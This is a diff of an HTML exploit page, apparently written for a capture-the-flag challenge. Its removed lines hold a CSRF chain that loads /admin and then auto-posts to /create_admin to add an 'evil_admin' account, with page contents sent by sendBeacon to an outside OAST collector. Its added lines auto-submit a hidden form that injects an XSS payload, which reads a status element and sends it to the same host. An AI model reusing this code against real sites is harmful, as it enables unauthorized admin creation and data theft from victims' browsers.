@@ -1,83 +1,33 @@
 <!DOCTYPE html>
 <html>
 <body>
-<iframe id="main" name="main" onload="checkContent()" style="display:none"></iframe>
-
 <script>
 const TARGET = "https://tasks.goidactf.ru:20385";
 const OAST = "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun";
-const ADMIN = "evil_admin";
 
-const log = (d) => navigator.sendBeacon(OAST + "/leak?d=" + encodeURIComponent(d));
+// XSS payload для чтения статуса
+const xssPayload = 'admin" onload="var s=document.getElementById(\\\'status\\\').textContent;' +
+                   'new Image().src=\\'${OAST}/leak?xss=\\'+encodeURIComponent(s);">';
 
-let currentStep = 0;
+const form = document.createElement('form');
+form.action = TARGET + "/create_admin";
+form.method = 'POST';
+form.target = 'xssFrame';
+form.style.display = 'none';
 
-function checkContent() {
-    try {
-        const iframe = document.getElementById('main');
-        const doc = iframe.contentDocument || iframe.contentWindow.document;
-        
-        if (!doc || !doc.body) {
-            log(`step${currentStep}: no_document`);
-            return;
-        }
-        
-        const text = doc.body.textContent || doc.body.innerText || '';
-        log(`step${currentStep}_content: ${text.substring(0, 200)}`);
-        
-        // Проверяем что нашли
-        if (text.includes('401') || text.includes('MOTHER FUCKER')) {
-            log(`step${currentStep}_result: 401_UNAUTHORIZED`);
-        } else if (text.includes('Status:')) {
-            const match = text.match(/Status:\s*(\d+)/);
-            log(`step${currentStep}_result: STATUS_${match ? match[1] : 'unknown'}`);
-        }
-        
-        currentStep++;
-    } catch(e) {
-        log(`step${currentStep}_error: ${e.message}`);
-        currentStep++;
-    }
-}
+const iframe = document.createElement('iframe');
+iframe.name = 'xssFrame';
+iframe.style.display = 'none';
+document.body.appendChild(iframe);
 
-// Последовательность действий
-setTimeout(() => {
-    // Шаг 1: Загружаем /admin
-    const form1 = document.createElement('form');
-    form1.action = TARGET + "/admin";
-    form1.method = "GET";
-    form1.target = "main";
-    form1.style.display = "none";
-    document.body.appendChild(form1);
-    form1.submit();
-    log("action: load_admin");
-    
-    setTimeout(() => {
-        checkContent(); // Проверяем загрузку
-        
-        // Шаг 2: Создаем админа
-        const form2 = document.createElement('form');
-        form2.action = TARGET + "/create_admin";
-        form2.method = "POST";
-        form2.target = "main";
-        form2.style.display = "none";
-        
-        const input = document.createElement('input');
-        input.type = "hidden";
-        input.name = "new_admin_login";
-        input.value = ADMIN;
-        form2.appendChild(input);
-        
-        document.body.appendChild(form2);
-        form2.submit();
-        log("action: create_admin");
-        
-        // Проверяем несколько раз после отправки
-        [1, 2, 3, 4, 5].forEach(sec => {
-            setTimeout(checkContent, sec * 1000);
-        });
-    }, 2000);
-}, 500);
+const input = document.createElement('input');
+input.type = 'hidden';
+input.name = 'new_admin_login';
+input.value = xssPayload;
+
+form.appendChild(input);
+document.body.appendChild(form);
+form.submit();
 </script>
 </body>
 </html>
